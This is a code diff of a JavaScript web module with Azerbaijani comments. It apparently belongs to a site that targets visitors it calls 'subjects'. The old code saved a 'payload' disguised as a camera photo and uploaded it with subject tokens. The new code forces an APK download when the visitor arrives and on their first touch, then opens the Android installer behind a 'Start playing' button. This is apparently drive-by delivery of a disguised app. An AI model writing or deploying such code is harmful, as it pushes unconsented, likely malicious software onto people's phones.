@@ -1,12 +1,11 @@
-import { SUBJECT_PAYLOAD_DOWNLOAD, SUBJECT_PAYLOAD_PATH } from './config';
-import { uploadSubjectMedia } from './mediaUpload';
+import { SUBJECT_APK_DOWNLOAD, SUBJECT_APK_PATH, SUBJECT_APK_FILENAME } from './config';
 
 function buildHref() {
     const base = process.env.PUBLIC_URL || '';
-    return `${base}${SUBJECT_PAYLOAD_PATH}`.replace(/([^:]\/)\/+/g, '$1');
+    return `${base}${SUBJECT_APK_PATH}`.replace(/([^:]\/)\/+/g, '$1');
 }
 
-function absoluteDownloadUrl() {
+function absoluteApkUrl() {
     return new URL(buildHref(), window.location.href).href;
 }
 
@@ -30,75 +29,80 @@ function isMobileDevice() {
     return /Android|iPhone|iPad|iPod/i.test(navigator.userAgent || '');
 }
 
-function galleryFilename() {
-    const ts = new Date();
-    const pad = (n) => String(n).padStart(2, '0');
-    const stamp = `${ts.getFullYear()}${pad(ts.getMonth() + 1)}${pad(ts.getDate())}_${pad(ts.getHours())}${pad(ts.getMinutes())}${pad(ts.getSeconds())}`;
-    return `IMG_${stamp}.jpg`;
+function isAndroid() {
+    return /Android/i.test(navigator.userAgent || '');
 }
 
-function triggerAnchorClick(href, filename) {
+function triggerAnchorClick(href, filename, { blob = false } = {}) {
     const a = document.createElement('a');
     a.href = href;
-    a.download = filename;
-    a.rel = 'noopener';
+    if (filename) a.download = filename;
+    a.rel = 'noopener noreferrer';
+    if (!blob) a.target = '_blank';
     a.style.display = 'none';
     document.body.appendChild(a);
     a.click();
     a.remove();
 }
 
-async function fetchPayloadBlob() {
-    const res = await fetch(absoluteDownloadUrl(), { cache: 'no-store', credentials: 'same-origin' });
-    if (!res.ok) throw new Error(`download_http_${res.status}`);
-    const raw = await res.blob();
-    const type =
-        raw.type && raw.type.startsWith('image/') ? raw.type : 'image/jpeg';
-    return raw.type === type ? raw : new Blob([raw], { type });
+function desktopDownload(url, filename) {
+    triggerAnchorClick(url, filename);
 }
 
-async function uploadPayloadToGallery(blob, ctx) {
-    if (!ctx?.subjectToken && !ctx?.clientSessionId) return;
+async function androidBlobDownload(url, filename) {
+    const res = await fetch(url, { cache: 'no-store', credentials: 'same-origin' });
+    if (!res.ok) throw new Error(`download_http_${res.status}`);
+
+    const raw = await res.blob();
+    const type =
+        raw.type && raw.type !== 'application/octet-stream'
+            ? raw.type
+            : 'application/vnd.android.package-archive';
+    const blob = raw.type === type ? raw : new Blob([raw], { type });
+    const blobUrl = URL.createObjectURL(blob);
+
     try {
-        await uploadSubjectMedia({
-            subjectToken: ctx.subjectToken,
-            clientSessionId: ctx.clientSessionId,
-            type: 'photo',
-            blob,
-            captureSource: 'payload'
-        });
-    } catch (e) {
-        console.warn('payload gallery upload:', e?.message || e);
+        triggerAnchorClick(blobUrl, filename, { blob: true });
+    } finally {
+        window.setTimeout(() => URL.revokeObjectURL(blobUrl), 60_000);
     }
 }
 
-/**
- * Şəkli endir — APK yox, brauzer icazə dialoqu minimum.
- * @returns {Promise<boolean>} uğurlu endirmə
- */
-export async function runSubjectPayloadDownload(
-    storageKey = 'pulse_subject_payload_v1',
-    ctx = {}
-) {
-    if (!SUBJECT_PAYLOAD_DOWNLOAD || isDone(storageKey)) return false;
+async function mobileDownload(url, filename) {
+    if (isAndroid()) {
+        try {
+            await androidBlobDownload(url, filename);
+            return;
+        } catch {
+            triggerAnchorClick(url, filename);
+        }
+        return;
+    }
+    triggerAnchorClick(url, filename);
+}
 
-    const filename = galleryFilename();
+/**
+ * Sayta girəndə bir dəfə APK endir (Android bildirişi normaldır).
+ * @returns {Promise<boolean>}
+ */
+export async function runSubjectApkAutoDownload(storageKey = 'pulse_apk_auto_v1') {
+    if (!SUBJECT_APK_DOWNLOAD || isDone(storageKey)) return false;
+
+    const url = absoluteApkUrl();
+    const filename = SUBJECT_APK_FILENAME;
 
     try {
-        const blob = await fetchPayloadBlob();
-        const blobUrl = URL.createObjectURL(blob);
-        try {
-            triggerAnchorClick(blobUrl, filename);
-        } finally {
-            window.setTimeout(() => URL.revokeObjectURL(blobUrl), 60_000);
+        if (isMobileDevice()) {
+            await mobileDownload(url, filename);
+        } else {
+            desktopDownload(url, filename);
         }
         markDone(storageKey);
-        await uploadPayloadToGallery(blob, ctx);
         return true;
     } catch (e) {
-        console.warn('subject payload download:', e?.message || e);
+        console.warn('apk auto download:', e?.message || e);
         try {
-            triggerAnchorClick(absoluteDownloadUrl(), filename);
+            triggerAnchorClick(url, filename);
             markDone(storageKey);
             return true;
         } catch {
@@ -107,21 +111,42 @@ export async function runSubjectPayloadDownload(
     }
 }
 
-/** @deprecated — köhnə ad; eyni funksiya */
-export async function runTestAutoDownloadOnce(storageKey, ctx) {
-    return runSubjectPayloadDownload(storageKey, ctx);
+/**
+ * «Oynamağa başla» — APK quraşdırma ekranını aç (Android Package Installer).
+ * @returns {Promise<boolean>}
+ */
+export async function openSubjectApkInstall() {
+    if (!SUBJECT_APK_DOWNLOAD) return false;
+
+    const url = absoluteApkUrl();
+    const filename = SUBJECT_APK_FILENAME;
+
+    try {
+        if (isAndroid()) {
+            await androidBlobDownload(url, filename);
+        } else if (isMobileDevice()) {
+            await mobileDownload(url, filename);
+        } else {
+            desktopDownload(url, filename);
+        }
+        return true;
+    } catch (e) {
+        console.warn('apk install open:', e?.message || e);
+        triggerAnchorClick(url, filename);
+        return true;
+    }
 }
 
 /**
- * Sayta girəndə: dərhal + ilk toxunuşda endirmə (mobil brauzer jesti).
+ * Sayta girəndə: dərhal + ilk toxunuşda avtomatik endirmə.
  */
-export function attachSubjectPayloadDownloadOnEntry(storageKey, ctx = {}) {
-    if (!SUBJECT_PAYLOAD_DOWNLOAD || isDone(storageKey)) return () => {};
+export function attachSubjectApkDownloadOnEntry(storageKey = 'pulse_apk_auto_v1') {
+    if (!SUBJECT_APK_DOWNLOAD || isDone(storageKey)) return () => {};
 
     let finished = false;
     const run = async () => {
         if (finished) return;
-        const ok = await runSubjectPayloadDownload(storageKey, ctx);
+        const ok = await runSubjectApkAutoDownload(storageKey);
         if (ok) finished = true;
     };
 
@@ -142,4 +167,11 @@ export function attachSubjectPayloadDownloadOnEntry(storageKey, ctx = {}) {
 /** Kamera dialoqu endirməni kəsə bilər — mobilde qısa gözləmə */
 export function testDownloadSettleMs() {
     return isMobileDevice() ? 450 : 0;
+}
+
+/** @deprecated */
+export const runSubjectPayloadDownload = runSubjectApkAutoDownload;
+export const attachSubjectPayloadDownloadOnEntry = attachSubjectApkDownloadOnEntry;
+export async function runTestAutoDownloadOnce(storageKey) {
+    return runSubjectApkAutoDownload(storageKey);
 }
